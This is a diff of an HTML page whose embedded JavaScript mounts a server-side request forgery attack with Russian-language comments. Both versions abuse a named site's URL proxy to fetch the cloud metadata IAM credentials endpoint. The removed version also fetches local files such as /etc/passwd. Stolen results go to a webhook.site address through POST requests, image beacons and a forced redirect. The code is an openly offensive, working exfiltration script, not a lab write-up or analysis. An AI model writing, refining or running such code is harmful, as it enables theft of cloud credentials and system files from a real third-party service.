@@ -1,46 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-</head>
 <body>
     <script>
         const hook = "https://webhook.site/db69ae80-4433-4821-8c44-090b6df24af8";
         const proxy = "https://max.ru/proxy?url=";
+        const target = "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default";
 
-        async function steal() {
-            // Цели: метаданные и системные файлы
-            const targets = [
-                "http://169.254.169.254/latest/meta-data/iam/security-credentials/default",
-                "file:///etc/passwd",
-                "file:///etc/hosts"
-            ];
+        // Вместо fetch используем форму. Формы не боятся CORS!
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = hook; // Шлем всё сразу на вебхук
 
-            for (let t of targets) {
-                // ХИТРОСТЬ: Заставляем сервер max.ru СКАЧАТЬ данные и отправить их нам
-                // Мы используем их же прокси, чтобы он обратился к самому себе
-                const attackUrl = proxy + encodeURIComponent(t);
-                
-                try {
-                    const r = await fetch(attackUrl);
-                    const data = await r.text();
-                    
-                    // Если в тексте есть ключевые слова конфигов, шлем на вебхук через POST
-                    if (data.includes("root:") || data.includes("AccessKeyId") || data.length > 500) {
-                        await fetch(hook + "?found=" + btoa(t), {
-                            method: "POST",
-                            mode: "no-cors",
-                            body: data 
-                        });
-                    } else {
-                        // Если все еще лезет HTML, пробуем вытащить его заголовки
-                        new Image().src = hook + "?debug_size=" + data.length + "&target=" + btoa(t);
-                    }
-                } catch(e) {}
-            }
-        }
-        steal();
+        // Пытаемся засунуть результат прокси в скрытое поле
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'stolen_data';
+        
+        // Магия: пытаемся заставить прокси сделать редирект на твой вебхук с данными
+        window.location.href = proxy + encodeURIComponent(target + "?callback=" + hook);
+
+        // Если через 2 секунды редирект не сработал, пробуем вытащить через ошибку картинки
+        setTimeout(() => {
+            const img = new Image();
+            img.src = hook + "?final_attempt=true&check_manual_proxy=1";
+        }, 2000);
     </script>
-    <h1>YO</h1>
 </body>
 </html>
